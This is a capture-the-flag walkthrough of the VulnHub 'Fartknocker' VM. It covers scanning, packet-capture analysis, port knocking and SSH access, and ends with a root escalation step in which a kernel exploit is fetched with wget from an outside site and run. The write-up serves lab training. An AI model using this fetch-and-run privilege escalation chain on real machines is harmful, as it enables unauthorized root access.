<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Fartknocker VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-fartknocker-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-04-06T18:15:49+00:00">April 6, 2017</time><time class="updated" datetime="2025-06-10T20:30:15+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Top HatSec built a VM image “Fartknocker” and kept the challenge to capture the flag in his machine. This VM box is mainly designed for testing your network penetration skills, before solving this challenge you must know about network packet analysis and port knocking.</span></p>
<p><span style="color: #000000;"> <strong>Let’s begin!</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>Scan your network using the<strong> netdiscover </strong>command I found an IP address <strong>192.168.1.25</strong> in my network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ooZhw-ryVBs/WOaB5ThEDqI/AAAAAAAAPu0/nd4AWGZ02F8frSsXuv6LvWQnu49PFEWQQCLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Enumerate the target through aggressive scan; type following command for nmap scanning:</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.25</pre>
<p><span style="color: #000000;">So here I found only single <strong>port 80</strong> is <strong>open</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-j1CqpZPYPDI/WOaB73d2ioI/AAAAAAAAPvg/nGNnyyJTj8MF7FscaCCZYZhcgpqUY1tUACLcB/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Since port 80 is open I look toward browser and explore target IP 192.168.1.25, here I got a Link “<strong><em>Woah”</em></strong> without wasting time I just clicked on it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cbh_YM9c71M/WOaB85dQubI/AAAAAAAAPv0/J1_xfvrWNRIwNMp_8W0WKVWOBEKqwYWwQCLcB/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Link <strong>Woah</strong> contains a <strong>pcap1.pcap</strong> file; I download it to find out some clue.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-aotgGLpjLS8/WOaB9blSl3I/AAAAAAAAPv4/oPI9sft3elsPpGEyud8IFpMIzLSmXmEhwCLcB/s1600/4.png"/></span></p>
<p><span style="color: #000000;">This file open with Wireshark here I distinguish that VM box trying to connect over TCP ports 7000, 8000, and 9000. Behind the machine efforts on those 3 ports it gets discarded and some obstructed attempts on a connection RST, ACK; when I dig out more I found this technique is known as <strong>port knocking</strong>.</span></p>
<p><span style="color: #000000;">Port 7000 is used for connection but rejected.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HViC5nXjVLY/WOaB9Tq1jhI/AAAAAAAAPv8/9PcJAafX1lcgzC0uHT1KLW-VYTnMFpQTACLcB/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Port 8000 is used for connection but rejected.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3uwrYMYXqSk/WOaB9tMMQqI/AAAAAAAAPwI/xMw3g_37sT4INApj84sBxTf9UjxcZwLRwCLcB/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Port 9000 is used for connection but rejected.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QmLzgQb0gx0/WOaB99SFl4I/AAAAAAAAPwA/als4DYz0SxI21tJzy8zuZPJN4bI4JEyIwCLcB/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now send packets to 7000, 8000, 9000 so that these ports sequence will open another port. Therefore type the following command for nmap to perform a Sequential Port Scan.</span></p>
<pre class="lang:default decode:true">nmap -r -p 7000,8000,9000 192.168.1.25</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Owag9HbZKr0/WOaB94X7SrI/AAAAAAAAPwE/xbb33VBMhwsDSKy-gmXXA_ir7V9uBZ5VQCLcB/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Once again scan target machine using aggressive scan.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.25</pre>
<p><span style="color: #000000;"><strong>Great!</strong>  Here we can see <strong>8888</strong> is <strong>open</strong> now and from the screenshot, you read a new directory /<strong>burgerworld</strong>/</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-wABZ0p3qB7w/WOaB-iB4nsI/AAAAAAAAPwM/4-K0W_VG2FwLaGwi2lLzG_oDdzGgZEwDwCLcB/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Then I run towards browser to explore <strong>192.168.1.25/burgerworld/</strong> this time again I found another link <strong>heheh..hehh</strong> that contains one more pcap file again I download that <strong>pcap2.pcap</strong> file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-FBG8HIxEs9g/WOaB5iI4kMI/AAAAAAAAPu4/GlTTpZo7F6UsHR6oP_7MKozyYE0VnhRuQCLcB/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now the game is very clear Top HatSec had involved port knowing at each step, again I <strong>opened the pcap2</strong> file with Wireshark but this time I didn’t found any port knocking sequence, therefore, I randomly select a packet to follow it TCP stream.  Here you can <strong>select any packet </strong>to make right click on it and choose to <strong>follow</strong> <strong>option</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vM3KW8x3exc/WOaB5kVKBoI/AAAAAAAAPu8/14_EifaDVp48j89MDkt3m7EYwNEtEZUfQCLcB/s1600/11.png"/></span></p>
<p><span style="color: #000000;">TCP stream captured the following image point towards another clue through <strong>CAN YOU UNDERSTAND MY MESSAGE!</strong></span></p>
<p><span style="color: #000000;"><strong>Hush!</strong> His message was in the German language<strong>! </strong> </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pp5f5O4htSM/WOaB6QkTXmI/AAAAAAAAPvI/5g4YVZ1O4kAsLhi2WxePDb89_Y3CgkG6QCLcB/s1600/12.png"/></span></p>
<p><span style="color: #000000;">When I translate it I got <strong>one three three seven</strong>. This port 1337 could be another knocking port.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zivNlyEePNQ/WOaB6QJK2DI/AAAAAAAAPvE/amZBetI-WQwegm0iFvFiAzc_B3qEYMTnQCLcB/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Again type the following command for nmap to perform a Sequential Port Scan.</span></p>
<pre class="lang:default decode:true">nmap -r -p 1337 192.168.1.25</pre>
<p><span style="color: #000000;"><strong>Oooh!!! </strong>It is showing waste service means to perform a Sequential Port Scan fail to knock 1337.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-c1n4n_cRWsg/WOaB6Ow4QFI/AAAAAAAAPvA/cT2dkpwzleIK0GveQy85DAkJdwMb8aUlQCLcB/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Use another way “<strong>netcat</strong>” to knock port 1337:</span></p>
<pre class="lang:default decode:true">nc -nv 192.168.1.25 1337</pre>
<p><span style="color: #000000;">But connection refused now try the single port number.</span></p>
<pre class="lang:default decode:true">nc –nv 192.168.1.25 1
nc –nv 192.168.1.25 3
nc –nv 192.168.1.25 3
nc –nv 192.168.1.25 7</pre>
<p><span style="color: #000000;">Finally, port 1337 get opened which points towards /<strong>iamcornholio/</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tfVtKSYWKW0/WOaB7AoAi2I/AAAAAAAAPvU/8VbB8JqkUzECRhxWBhUoy7xMGQ0IIeNUgCLcB/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now Explore </span></p>
<pre class="lang:default decode:true">192.168.1.25/iamcornholio/</pre>
<p><span style="color: #000000;">This time I found a <strong>base 64 encode string</strong> which should be decoded so that we can move forward.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-20B5nweOsx0/WOaB6ulH3ZI/AAAAAAAAPvM/-CuI--wBvPYdm4xEoTrH2pjwCXdYZPD-gCLcB/s1600/16.png"/></span></p>
<p><span style="color: #000000;">I took the help of burp suite to decode this string “<strong>T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK</strong>” and what I found was quite interesting.</span></p>
<p><span style="color: #000000;"><strong>Open up SSH: 8888 9999 7777 6666</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--xW0bjRZMU4/WOaB64hFQuI/AAAAAAAAPvQ/IcsTxEsEmfMUZrctAenrDmpRlZGHvBtKQCLcB/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Again Use “<strong>netcat</strong>” to knock the following port:</span></p>
<pre class="lang:default decode:true">nc –nv 192.168.1.25 8888
nc –nv 192.168.1.25 9999
nc –nv 192.168.1.25 7777
nc –nv 192.168.1.25 6666</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-R8HcXLaId4Q/WOaB7S8NiII/AAAAAAAAPvc/ZgnBTCmWgxUDROAZIBpurRFw943DV9ohgCLcB/s1600/18.png"/></span></p>
<p><span style="color: #000000;">From the screenshot you can I have used version scan for the target.</span></p>
<pre class="lang:default decode:true">nmap -sV 192.168.1.25</pre>
<p><span style="color: #000000;"><strong>Awesome </strong>port <strong>22</strong> is opened for SSH</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-L9Eg46UTM88/WOaB7cWZzVI/AAAAAAAAPvY/ZXgNkt9AKDwXoymWZNatuJ4ICtiReVl-wCLcB/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now try to connect with the target through </span></p>
<pre class="lang:default decode:true">ssh -l butthead 192.168.1.25 /bin/bash</pre>
<p><span style="color: #000000;">Here I got successfully login now type the following command</span></p>
<pre class="lang:default decode:true">ls
uname -a</pre>
<p><span style="color: #000000;">I Found kernel version <strong>3.13.0</strong> now let’s find out whether there is an exploit related to its present or not.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-crYWvOUTfME/WOaB8K1_b3I/AAAAAAAAPvk/91_UOZLZRLkRBHGGyUHMegHkwAFQli5KgCLcB/s1600/21.png"/></span></p>
<p><span style="color: #000000;">With the help of Google, I found an exploit from the screenshot you can see the link for “<strong>ofs 32”</strong> click on it to download this exploit that allows a local user to take administration privilege.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-eims5EXBYiU/WOaB8GObdxI/AAAAAAAAPvo/3zBW3MOP7og7uBDBwxYBSEeBdCLw8uYhACLcB/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Now type the following command to download <strong>ofs 32</strong> inside the victim’s system and then achieve root privileges to capture the flag.</span></p>
<pre class="lang:default decode:true">wget https://www.kernel-exploit.com/media/ofs_32
ls
./ofs_32</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pbD-3b-JRJU/WOaB8lfydbI/AAAAAAAAPvs/DVzu71zIQgcjlcuLj5sv6R1FfMYvnQM0wCLcB/s1600/23.png"/></span></p>
<pre class="lang:default decode:true ">id
cd /root
ls
cat secretz
SECRET = "LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK"</pre>
<p><span style="color: #000000;"><strong>!!</strong>This was very curies and most challenging machine<strong>!!</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-MsdSce-2fr0/WOaB8qC2lbI/AAAAAAAAPvw/7Lm2SbgOgw8tk7I3RWKuGaVnlwa_HlPFwCLcB/s1600/24.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
